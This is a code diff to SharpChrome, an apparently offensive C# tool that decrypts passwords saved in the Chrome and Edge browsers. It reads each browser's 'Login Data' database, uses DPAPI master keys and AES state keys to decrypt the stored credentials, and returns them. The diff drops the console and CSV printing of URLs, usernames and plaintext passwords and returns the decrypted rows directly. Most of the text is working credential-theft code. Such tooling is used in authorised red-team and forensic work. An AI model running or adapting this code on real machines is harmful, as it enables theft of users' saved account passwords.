@@ -103,10 +103,8 @@ namespace SharpChrome
                 byte[] chromeAesStateKey = GetStateKey(masterKeys, chromeAesStateKeyPath, unprotect, quiet);
                 byte[] edgeAesStateKey = GetStateKey(masterKeys, edgeAesStateKeyPath, unprotect, quiet);
 
-                 var chromeLogins = ParseAndReturnChromeLogins(masterKeys, chromeLoginDataPath, displayFormat, showAll, unprotect, chromeAesStateKey,
-                    quiet);
-                var edgePasswords = ParseAndReturnChromeLogins(masterKeys, edgeLoginDataPath, displayFormat, showAll, unprotect, edgeAesStateKey,
-                    quiet);
+                 var chromeLogins = ParseAndReturnChromeLogins(chromeLoginDataPath, chromeAesStateKey);
+                var edgePasswords = ParseAndReturnChromeLogins(edgeLoginDataPath, edgeAesStateKey);
             }
         }
     }
@@ -177,9 +175,7 @@ namespace SharpChrome
 
     internal partial class Chrome
     {
-        public static List<ExtractedPassword> ParseAndReturnChromeLogins(Dictionary<string, string> masterKeys, string loginDataFilePath,
-            string displayFormat = "table", bool showAll = false, bool unprotect = false, byte[] aesStateKey = null,
-            bool quiet = false)
+        public static List<logins> ParseAndReturnChromeLogins(string loginDataFilePath, byte[] aesStateKey)
         {
             // takes an individual 'Login Data' file path and performs decryption/triage on it
             if (!File.Exists(loginDataFilePath)) {
@@ -211,11 +207,6 @@ namespace SharpChrome
                 return default;
             }
 
-            if (!displayFormat.Equals("table") && !displayFormat.Equals("csv")) {
-                Console.WriteLine("\r\n[X] Invalid format: {0}", displayFormat);
-                return default;
-            }
-
             string discriminatingQuery =
                 "SELECT signon_realm, origin_url, username_value, password_value, times_used, cast(date_created as text) as date_created FROM logins";
             string everyColQuery = "SELECT * FROM logins";
@@ -224,92 +215,10 @@ namespace SharpChrome
             
             List<logins> allLogins = database.Query<logins>(everyColQuery, false);
             var allLoginsDecryptedPwd = allLogins.DecryptPasswords(aesStateKey);
-
-            List<ExtractedPassword> passwords = new List<ExtractedPassword>(results.Count);
-
-            foreach (SQLiteQueryRow row in results) {
-                byte[] passwordBytes = (byte[])row.column[3].Value;
-                byte[] decBytes = null;
-
-                // decrypt the password bytes using masterkeys or CryptUnprotectData()
-
-                if (HasV10Header(passwordBytes)) {
-                    if (aesStateKey != null) {
-                        // using the new DPAPI decryption method
-                        decBytes = DecryptAESChromeBlob(passwordBytes, hAlg, hKey);
-
-                        if (decBytes == null) {
-                            continue;
-                        }
-                    }
-                    else {
-                        decBytes = Encoding.ASCII.GetBytes("--AES STATE KEY NEEDED--");
-                    }
-                }
-                else {
-                    // using the old method
-                    decBytes = SharpDPAPI.Dpapi.DescribeDPAPIBlob(passwordBytes, masterKeys, "chrome", unprotect);
-                }
-
-                string password = Encoding.ASCII.GetString(decBytes);
-
-                DateTime dateCreated = SharpDPAPI.Helpers.ConvertToDateTime(row.column[5].Value.ToString());
-
-                if ((password != String.Empty) || showAll) {
-                    if (displayFormat.Equals("table")) {
-                        if (!someResults) {
-                            Console.WriteLine("\r\n--- Credential (Path: {0}) ---\r\n", loginDataFilePath);
-                        }
-
-                        someResults = true;
-                        Console.WriteLine("URL       : {0} ({1})", row.column[0].Value, row.column[1].Value);
-                        Console.WriteLine("Created   : {0}", dateCreated);
-                        Console.WriteLine("TimesUsed : {0}", row.column[4].Value);
-                        Console.WriteLine("Username  : {0}", row.column[2].Value);
-                        Console.WriteLine("Password  : {0}", password);
-                        Console.WriteLine();
-                    }
-                    else {
-                        if (!someResults) {
-                            if (!quiet) {
-                                Console.WriteLine("\r\n---  Credential (Path: {0}) ---\r\n", loginDataFilePath);
-                            }
-                            else {
-                                Console.WriteLine("SEP=,");
-                            }
-
-                            Console.WriteLine("file_path,signon_realm,origin_url,date_created,times_used,username,password");
-                        }
-
-                        someResults = true;
-
-                        var one = SharpDPAPI.Helpers.StringToCSVCell(loginDataFilePath);
-                        var two = SharpDPAPI.Helpers.StringToCSVCell($"{row.column[0].Value}");
-                        var three = SharpDPAPI.Helpers.StringToCSVCell($"{row.column[1].Value}");
-                        var four = SharpDPAPI.Helpers.StringToCSVCell(dateCreated.ToString());
-                        var five = SharpDPAPI.Helpers.StringToCSVCell($"{row.column[5].Value}");
-                        var six = SharpDPAPI.Helpers.StringToCSVCell($"{row.column[2].Value}");
-                        var seven = SharpDPAPI.Helpers.StringToCSVCell(password);
-
-                        var ep = new ExtractedPassword() {
-                            signon_realm = two,
-                            origin_url = three,
-                            date_created = dateCreated,
-                            times_used = five,
-                            username = six,
-                            password = seven
-                        };
-
-                        passwords.Add(ep);
-
-                        Console.WriteLine("{0},{1},{2},{3},{4},{5},{6}", one, two, three, four, five, six, seven);
-                    }
-                }
-            }
-
+            
             database.Close();
 
-            return passwords;
+            return allLoginsDecryptedPwd;
         }
         
         public static void InsertPasswordsIntoDbFile(string loginDataFilePath, IEnumerable<ExtractedPassword> passwords)
